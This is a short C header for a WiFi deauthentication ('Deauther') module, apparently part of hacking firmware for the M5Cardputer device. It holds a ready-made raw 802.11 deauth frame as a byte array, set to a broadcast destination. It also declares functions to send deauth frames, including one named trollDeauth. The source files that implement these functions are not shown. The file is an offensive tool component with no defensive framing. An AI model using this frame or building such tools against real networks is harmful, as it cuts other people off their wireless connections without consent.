#ifndef DEAUTHER_H
#define DEAUTHER_H

#include <M5Cardputer.h>

#include "../../includes/wifi_sniffer.h"
#include "../../includes/wifi.h"
#include "../../menu.h"

static const uint8_t deauth_frame_default[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00
};

void send_deauth(const uint8_t *source_mac, const uint8_t *client_addr, const uint8_t *ap_addr);
void trollDeauth(const uint8_t *client_addr, const uint8_t *ap_addr);
int Deauther();

#endif